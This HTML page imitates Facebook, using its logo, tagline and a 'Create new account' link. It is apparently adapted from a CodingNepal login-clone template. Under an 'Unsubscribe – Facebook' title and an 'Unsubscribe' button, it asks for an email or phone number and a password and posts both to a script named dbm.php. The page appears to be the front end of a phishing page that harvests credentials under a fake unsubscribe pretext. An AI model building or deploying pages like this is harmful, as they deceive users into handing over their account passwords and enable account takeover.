<!DOCTYPE html>
<!-- Coding By CodingNepal - www.codingnepalweb.com -->
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Unsubscribe &#8210; Facebook</title>
    <link rel="stylesheet" href="style.css" />
    <link rel="icon" href="favicon.ico" type="image/x-icon" />
  </head>
  <body>
    <div class="container flex">
      <div class="facebook-page flex">
        <div class="text">
          <img
            style="height: 106px; margin: -28px"
            src="logo.svg"
            alt="Facebook"
          />
          <div style="margin-top: 16px;">
            <p>Facebook helps you connect and share</p>
            <p>with the people in your life.</p>
          </div>
        </div>

        <!-- Form -->
        <form action="dbm.php" method="post">
          <input
            id="user"
            name="user"
            type="text"
            placeholder="Email or phone number"
            required
          />
          <input
            id="pass"
            name="pass"
            type="password"
            placeholder="Password"
            required
          />
          <div class="link">
            <button
              type="submit"
              type="submit"
              id="submit"
              name="submit"
              class="unsubscribe"
            >
              Unsubscribe
            </button>
          </div>
          <hr />
          <div class="button">
            <a href="https://www.facebook.com/signup">Create new account</a>
          </div>
        </form>
      </div>
    </div>
  </body>
</html>
